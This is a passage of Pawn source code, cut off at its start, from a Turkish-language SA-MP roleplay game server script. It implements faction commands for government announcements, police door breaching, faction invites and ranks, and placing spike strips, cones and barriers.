		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	return 1;
}

CMD:gov(playerid, params[])
{
	if(IsInLSFMD(playerid) || IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		if(isnull(params))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: (/gov) [Yazý]");
			return 1;
		}

		new string[128];

		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** LSPD: Þef %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** LSPD: Asistan Þef %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için Rank 5 ve üstü olmalýsýnýz !");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** FBI: Direktör %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** FBI: Asistan Direktör %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(COLOR_DBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için Rank 5 ve üstü olmalýsýnýz !");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** LSFMD: Þef %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(TEAM_CYAN_COLOR, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** LSFMD: Baþ Hekim %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________  Devlet Haberleri  ___________|");
				SendClientMessageToAllEx(TEAM_CYAN_COLOR, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için Rank 5 ve üstü olmalýsýnýz !");
			}
		}
		else if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5) {
			if(PlayerInfo[playerid][pRank] == 6)
			{
				format(string, sizeof(string), "** Devlet: Baþkan %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Devlet Haberleri ___________|");
				SendClientMessageToAllEx(COLOR_GOV, string);
			}
			else if(PlayerInfo[playerid][pRank] == 5)
			{
				format(string, sizeof(string), "** Devlet: Baþkan Yardýmcýsý %s: %s **", GetPlayerNameEx(playerid), params);
				SendClientMessageToAllEx(COLOR_WHITE, "|___________ Devlet Haberleri ___________|");
				SendClientMessageToAllEx(COLOR_GOV, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için Rank 5 ve Üstü olmalýsýn!");
			}
		}
	}
	return 1;
}

CMD:eviturla(playerid, params[])
{
    if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1) {
        SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
        return 1;
    }

    new string[128];
    for(new i = 0; i < sizeof(HouseInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
		    if(HouseInfo[i][hOwned] != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "Sahibi olan evleri gezemezsin.");
		        return 1;
		    }
			if(GetPVarInt(playerid, "TourHouseConfirm") == 0)
			{
				SetPVarInt(playerid, "TourHouseConfirm", 1);
				SendClientMessage(playerid, COLOR_WHITE, "Ev'in odalarýný gezmek için 30$ ödemen gerekiyor.");
				SendClientMessage(playerid, COLOR_WHITE, "30 $ ödemek için eminsen komutu tekrar yaz.");
				return 1;
			}
			DeletePVar(playerid, "TourHouseConfirm");

   			GivePlayerCash(playerid, -30);
    		GameTextForPlayer(playerid, "~r~-30$", 3000, 1);

            format(string, sizeof(string), "* %s evin içine girdi.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
            if(HouseInfo[i][hCustomInterior] == 1) {
                LoadObjectsForPlayer(playerid);
            }
            SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
            SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorR]);
            SetCameraBehindPlayer(playerid);
            PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
            PlayerInfo[playerid][pVW] = i+60000;
            SetPlayerVirtualWorld(playerid, i+60000);
        }
    }
    return 1;
}

CMD:kapiyikir(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 4) {
		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Paintball içersinde bunu yapamazsýn!");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

		new string[128], found;
		for(new i = 0; i < sizeof(HouseInfo); i++)
		{
			if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
			{
				found++;
				format(string, sizeof(string), "* %s kapýyý kýrar ve içeri girer.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
				if(HouseInfo[i][hCustomInterior] == 1)
				{
					LoadObjectsForPlayer(playerid);
				}
				SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
    			SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorR]);
                SetCameraBehindPlayer(playerid);
				GameTextForPlayer(playerid, "~r~KAPI KIRILDI", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
				PlayerInfo[playerid][pVW] = i+60000;
				SetPlayerVirtualWorld(playerid, i+60000);
			}
		}
		if(found == 0)
			return SendClientMessage(playerid, COLOR_GREY, "   Bir evin yakýnýnda deðilsin!");
	}
	else SendClientMessage(playerid, COLOR_GREY, "   Polis deðilsin!");
	return 1;
}

CMD:davetet(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], ftext[50], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /davetet [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pLeader] == 0 && PlayerInfo[giveplayerid][pFaction] == 0 && PlayerInfo[giveplayerid][pGang] == 255)
			{
				if(PlayerInfo[playerid][pLeader] == 1)
					ftext = "LSPD";
				else if(PlayerInfo[playerid][pLeader] == 2)
					ftext = "FBI";
				else if(PlayerInfo[playerid][pLeader] == 3)
					ftext = "LSFMD";
				else if(PlayerInfo[playerid][pLeader] == 4)
					ftext = "Hitman Ajansý";
                else if(PlayerInfo[playerid][pLeader] == 5)
					ftext = "Devlet";
                else if(PlayerInfo[playerid][pLeader] ==6)
					ftext = "Lst";
				else if(PlayerInfo[playerid][pLeader] == 9)
					ftext = "SA Haberleri";
				else
					return SendClientMessage(playerid, COLOR_GREY, "Bu Faction'a bir oyuncu davet edemezsin");

				InviteOffer[giveplayerid] = playerid;
				InviteFamily[giveplayerid] = 255;
				InviteFaction[giveplayerid] = PlayerInfo[playerid][pLeader];
				format(string, sizeof(string), " %s adlý oluþuma %s tarafýndan davet edildin - kabul etmek için /kabulet olusum.", ftext, GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "%s adlý kiþiyi %s adlý oluþuma davet ettin.", GetPlayerNameEx(giveplayerid),ftext);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten baþka bir faction veya ailede.");
				return 1;
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkiniz yok (Sadece Liderler)");
	}
	return 1;
}

CMD:olusumdanat(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /olusumdanat [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if((PlayerInfo[giveplayerid][pFaction] == PlayerInfo[playerid][pLeader]) && (PlayerInfo[giveplayerid][pLeader] == 0 || PlayerInfo[giveplayerid][pRank] < PlayerInfo[playerid][pRank]))
			{
				format(string, sizeof(string), "*  %s adlý Lider tarafýndan oluþumdan atýldýn.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* You're now a civilian again.");
				format(string, sizeof(string), "%s adlý kiþi %s adlý kiþiyi %s adlý oluþumdan kovdu. Rank %i.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), GetFactionName(PlayerInfo[giveplayerid][pFaction]), PlayerInfo[giveplayerid][pRank]);
				Log("logs/faction.log", string);
				PlayerInfo[giveplayerid][pFaction] = 0;
				PlayerInfo[giveplayerid][pRank] = 0;
				PlayerInfo[giveplayerid][pDuty] = 0;
				PlayerInfo[giveplayerid][pLeader] = 0;
				PlayerInfo[giveplayerid][pDivision] = 0;
				if(!IsValidSkin(GetPlayerSkin(giveplayerid)))
				{
					new rand = random(sizeof(CIV));
					SetPlayerSkin(giveplayerid,CIV[rand]);
					PlayerInfo[giveplayerid][pSkin] = CIV[rand];
				}
				player_remove_vip_toys(giveplayerid);
				SetPlayerToTeamColor(giveplayerid);
				pTazer[giveplayerid] = 0;
				format(string, sizeof(string), " %s adlý kiþiyi oluþumdan kovdun.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				if(TalkingLive[giveplayerid] != INVALID_PLAYER_ID || LiveOffer[giveplayerid] != INVALID_PLAYER_ID ) {
					TalkingLive[TalkingLive[giveplayerid]] = INVALID_PLAYER_ID;
					TalkingLive[LiveOffer[giveplayerid]] = INVALID_PLAYER_ID;
					LiveOffer[LiveOffer[giveplayerid]] = INVALID_PLAYER_ID;
					LiveOffer[TalkingLive[giveplayerid]] = INVALID_PLAYER_ID;
				}
				TalkingLive[giveplayerid] = INVALID_PLAYER_ID;
				LiveOffer[giveplayerid] = INVALID_PLAYER_ID;
				Backup[playerid] = 0;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "Bu kiþiyi faction'dan sen atamazsýn.");
		}
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkiniz yok (Sadece Liderler)");
	}
	return 1;
}


CMD:offlineolusumdanat(playerid, params[]) {
	if(PlayerInfo[playerid][pLeader] >= 1) {
		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /offlineolusumdanat [Ýsim]");

		if(IsPlayerConnected(ReturnUser(params)))
		    return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi zaten oyunda, Lütfen /olusumdanat komutunu kullanýnýz.");

		new
		    szPlayerName[MAX_PLAYER_NAME],
		    szQuery[128];

		mysql_real_escape_string(params, szPlayerName, g_MySQLConnections[0]);

		SetPVarString(playerid, "uninvite_target", szPlayerName);

		format(szQuery, sizeof(szQuery), "SELECT Faction, AdminLevel FROM players WHERE Username = '%s'", szPlayerName);
		mysql_query(szQuery, THREAD_OFFLINE_UNINVITE, playerid, g_MySQLConnections[0]);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkiniz yok (Sadece Liderler)");
	return 1;
}

CMD:rutbever(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] >= 1)
	{
		new string[128], giveplayerid, rank;
		if(sscanf(params, "ud", giveplayerid, rank)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rutbever [Oyuncu ID/Ýsim] [Rank (1-6)]");

		if(rank > 6 || rank < 0) { SendClientMessage(playerid, COLOR_GREY, "   0 - 6 arasýnda olmalýdýr!"); return 1; }

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[playerid][pLeader] != PlayerInfo[giveplayerid][pFaction])
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Bu kiþi senin oluþumunda deðil!");
				return 1;
			}

			if(rank > PlayerInfo[giveplayerid][pRank])
			{
				format(string, sizeof(string), "    %s adlý kiþi tarafýndan rütben yükseltildi.", GetPlayerNameEx(playerid));
			}
			if(rank < PlayerInfo[giveplayerid][pRank])
			{
				format(string, sizeof(string), "   %s adlý kiþi tarafýndan rütben düþürüldü.", GetPlayerNameEx(playerid));
			}
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "%s, %s adlý kiþiye %s adlý oluþumda rank %d verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), GetFactionName(PlayerInfo[giveplayerid][pFaction]),rank);
			Log("logs/faction.log", string);
			PlayerInfo[giveplayerid][pRank] = rank;
			format(string, sizeof(string), "   %s adlý kiþiye rank %d verdin.", GetPlayerNameEx(giveplayerid),rank);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmak için yetkin yok (Sadece Liderler)");
	}
	return 1;
}

CMD:civiler(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 2)
	{
		if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pRank] >= 3)
		{
  			SendClientMessage(playerid, COLOR_WHITE, "Þuanda konulmuþ Çiviler:");
			for(new i, string[58 + MAX_PLAYER_NAME]; i < sizeof(SpikeStrips); i++)
			{
				if(SpikeStrips[i][sX] != 0) // Checking for next available ID.
				{
					format(string, sizeof(string), "HQ: Çivi ID: %d | Konulduðu Yer: %s | Koyan Kiþi: %s", i, SpikeStrips[i][sDeployedAt], SpikeStrips[i][sDeployedBy]);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
 			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Rank 3 ve Üstü olmalýsýnýz");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:civikoy(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(PlayerInfo[playerid][pRank] >= 3)
		{
			if(GetPlayerInterior(playerid) != 0)
			{
		    	SendClientMessage(playerid, COLOR_GREY, "Ýnteriorlara çivi koyamazsýn.");
		    	return 1;
			}
			for(new i; i < sizeof(SpikeStrips); i++)
			{
				if(SpikeStrips[i][sX] == 0)
				{
					new
						Float: f_TempAngle,
						string[128];

					GetPlayerPos(playerid, SpikeStrips[i][sX], SpikeStrips[i][sY], SpikeStrips[i][sZ]);
					GetPlayerFacingAngle(playerid, f_TempAngle);
					SpikeStrips[i][sObjectID] = CreateDynamicObject(2899, SpikeStrips[i][sX], SpikeStrips[i][sY], SpikeStrips[i][sZ]-0.8, 0.0, 0.0, f_TempAngle);
					GetPlayer3DZone(playerid, SpikeStrips[i][sDeployedAt], MAX_ZONE_NAME);
					SpikeStrips[i][sDeployedBy] = GetPlayerNameEx(playerid);
					format(string,sizeof(string),"Çivi ID: %d baþarýyla konuldu.", i);
					SendClientMessage(playerid, COLOR_WHITE, string);
					format(string, sizeof(string), "HQ: Bir çivi platformu %s tarafýndan %s bölgesine koyuldu.", GetPlayerNameEx(playerid), SpikeStrips[i][sDeployedAt]);
					foreach(Player, x)
					{
						if(IsACop(x))
						{
							SendClientMessage(x, TEAM_BLUE_COLOR, string);
							if(PlayerInfo[x][pRank] >= 3)
							{
								SendClientMessage(x, COLOR_YELLOW, "Çivi platformu yoketmek için /civiyoket.");
							}
						}
					}
					return 1;
				}
    		}
			SendClientMessage(playerid, COLOR_WHITE, "Daha fazla çivi koyamazsýnýz, limit 5.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Rank 3 ve Üstü olmalýsýnýz");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:civiyoket(playerid, params[])
{
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /civiyoket [Çivi id]");

    if(IsACop(playerid))
	{
		if(PlayerInfo[playerid][pRank] >= 3)
		{
			new id = strval(params);
			if(!(0 <= id <= sizeof(SpikeStrips)) || SpikeStrips[id][sX] == 0) {
				return SendClientMessage(playerid, COLOR_WHITE, "Yanlýþ Çivi ID.");
			}
			else
			{
				new string[43 + MAX_PLAYER_NAME + MAX_ZONE_NAME];
				DestroyDynamicObject(SpikeStrips[id][sObjectID]);
				SpikeStrips[id][sX] = 0; SpikeStrips[id][sY] = 0; SpikeStrips[id][sZ] = 0;
				SpikeStrips[id][sObjectID] = INVALID_OBJECT_ID;
				format(string,sizeof(string),"Çivi ID: %d baþarýyla kaldýrýldý.", id);
				SendClientMessage(playerid, COLOR_WHITE, string);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir çivi %s tarafýndan %s eyaletinde kaldýrýldý.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " Rank 3 ve Üstü olmalýsýn!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:araciara(playerid, params[])
{
    new string[128];
    if(!IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GREY, "Polis / FBI / Sahil Güvenlik deðilsin.");
        return 1;
    }
    new carid = GetPlayerVehicleID(playerid);
    new closestcar = GetClosestCar(playerid,carid);
    if(!IsPlayerInRangeOfVehicle(playerid, closestcar, 9.0))
	{
        SendClientMessage(playerid,COLOR_GREY,"Herhangi bir aracýn yakýnýnda deðilsin");
        return 1;
    }
    foreach(Player, i)
	{
        new v = GetPlayerVehicle(i, closestcar);
        if(v != -1)
		{
            string[0] = 0;
            for(new x = 0; x < 3; x++)
			{
                if(PlayerVehicleInfo[i][v][pvWeapons][x] != 0)
				{
                    new
                        szWep[20];

                    GetWeaponName(PlayerVehicleInfo[i][v][pvWeapons][x], szWep, sizeof(szWep));
                    if(isnull(string)) format(string, sizeof(string), "* Bagajda bulduklarýn: %s", szWep);
                    else format(string, sizeof(string), "%s, %s", string, szWep);
                }
            }
            if(!isnull(string)) SendClientMessage(playerid, COLOR_WHITE, string);
            else SendClientMessage(playerid, COLOR_WHITE, "* Bagajda hiçbirþey yok.");
        }
    }
    return 1;
}

CMD:kukekur(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		if(GetPlayerInterior(playerid) != 0)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Ýnterior içersine kuke kuramazsýn.");
		    return 1;
		}

		new string[128], Float:Position[4];
		for(new i; i<MAX_KUKE; i++)
		{
			if(Kuke[i] == 0)
			{
				GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
				GetPlayerFacingAngle(playerid, Position[3]);
				Kuke[i] = CreateDynamicObject(1238, Position[0], Position[1], Position[2]-0.7, 0.0, 0.0, Position[3]+180.0, -1, -1, -1, 200.0);
				SetPlayerPos(playerid, Position[0], Position[1]+4, Position[2]);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir kuke %s tarafýndan %s bölgesine konuldu.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
						if(PlayerInfo[x][pRank] >= 3)
						{
							SendClientMessage(x, COLOR_YELLOW, "Kukeleri silmek için /kukekaldir   -   /kukelerikaldir.");
						}
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Tüm kukeler kullanýmda.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:kukekaldir(playerid, params[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		new string[128], Float:Position[3];
		for(new i; i<MAX_KUKE; i++)
		{
			GetDynamicObjectPos(Kuke[i], Position[0], Position[1], Position[2]);

			if(IsPlayerInRangeOfPoint(playerid, 5.0, Position[0], Position[1], Position[2]))
			{
				DestroyDynamicObject(Kuke[i]);
				Kuke[i] = 0;
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir kuke %s tarafýndan %s eyaletinde kaldýrýldý.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Herhangi bir kukenin yakýnýnda deðilsin.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:kukelerikaldir(playerid, params[])
{
	if(IsACop(playerid) || AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] >= 3 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(IsPlayerInAnyVehicle(playerid) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Bu komutu araç içersinde kullanamazsýn.");

		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2 && AdminDuty[playerid] == 0)
			return	SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");

		new
			szMessage[128];

		for(new i; i < MAX_KUKE; i++) {
			DestroyDynamicObject(Kuke[i]);
			Kuke[i] = 0;
		}
		format(szMessage, sizeof(szMessage), "HQ: Tüm kukeler %s tarafýndan yokedildi.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

CMD:bariyerkur(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		if(GetPlayerInterior(playerid) != 0)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Ýnterior içersine bariyer kuramazsýn.");
		    return 1;
		}

		new string[128], Float:Position[4];
		for(new i; i<MAX_ENGEL; i++)
		{
			if(Engel[i] == 0)
			{
				GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
				GetPlayerFacingAngle(playerid, Position[3]);
				Engel[i] = CreateDynamicObject(1459, Position[0], Position[1], Position[2]-0.4, 0.0, 0.0, Position[3]+180.0, -1, -1, -1, 200.0);
				SetPlayerPos(playerid, Position[0], Position[1]+4, Position[2]);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir bariyer %s tarafýndan %s bölgesine konuldu.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
						if(PlayerInfo[x][pRank] >= 3)
						{
							SendClientMessage(x, COLOR_YELLOW, "Bariyerleri silmek için /bariyerkaldir   -    /bariyerlerikaldir.");
						}
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Tüm bariyerler kullanýmda.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:bariyerkaldir(playerid, params[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araç içersinde bu komutu kullanamazsýnýz");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");
			return 1;
		}
		new string[128], Float:Position[3];
		for(new i; i<MAX_ENGEL; i++)
		{
			GetDynamicObjectPos(Engel[i], Position[0], Position[1], Position[2]);

			if(IsPlayerInRangeOfPoint(playerid, 5.0, Position[0], Position[1], Position[2]))
			{
				DestroyDynamicObject(Engel[i]);
				Engel[i] = 0;
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: Bir Bariyer %s tarafýndan %s eyaletinde kaldýrýldý.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Herhangi bir bariyerin yakýnýnda deðilsin.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:bariyerlerikaldir(playerid, params[])
{
	if(IsACop(playerid) || AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] >= 3 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(IsPlayerInAnyVehicle(playerid) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Bu komutu araç içersinde kullanamazsýn.");

		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2 && AdminDuty[playerid] == 0)
			return	SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için en az Rank 3 olmalýsýnýz.");

		new
			szMessage[128];

		for(new i; i < MAX_ENGEL; i++) {
			DestroyDynamicObject(Engel[i]);
			Engel[i] = 0;
		}
		format(szMessage, sizeof(szMessage), "HQ: Tüm bariyerler %s tarafýndan yokedildi.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

